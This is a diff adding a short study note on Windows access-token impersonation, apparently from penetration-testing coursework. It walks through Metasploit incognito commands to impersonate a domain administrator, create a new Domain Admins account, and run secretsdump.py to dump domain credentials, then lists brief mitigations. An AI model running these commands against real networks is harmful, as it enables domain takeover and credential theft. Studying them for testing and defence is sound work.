@@ -1,0 +1,35 @@
+What are tokens:
+  Temporary keys that allow you access to a system/network without
+  having to provide credentials each time you access a file.
+  Like cookies for computers.
+
+Two types:
+  Delegate - Created for logging into a machine or using
+  Remote Desktop
+  Impersonate - "non-interactive" such as attaching a network
+  drive or a domain logon script
+
+Key flaw:
+  Token impersonation - in metasploit pop a shell and: 
+    load incognito 
+    list_tokens -u
+    impersonate_token <DOMAIN>\\<USER>
+    shell
+    whoami
+    ^C
+    rev2self
+    getuid
+    list_tokens -u
+    impersonate_token <DOMAIN>\\administrator
+    shell
+    whoami
+  PoC that I am admin:
+    net user /add user1 Password1 /domain
+    net group "Domain Admins" user1 /ADD /DOMAIN
+  Now we can login as the new admin user and dump out password
+    secretsdump.py <DOMAIN>.local/user1:'Password1'@<DC_IP>
+
+Mitigation:
+  Limit user/group token creation permission
+  Account tiering
+  Local admin restriction
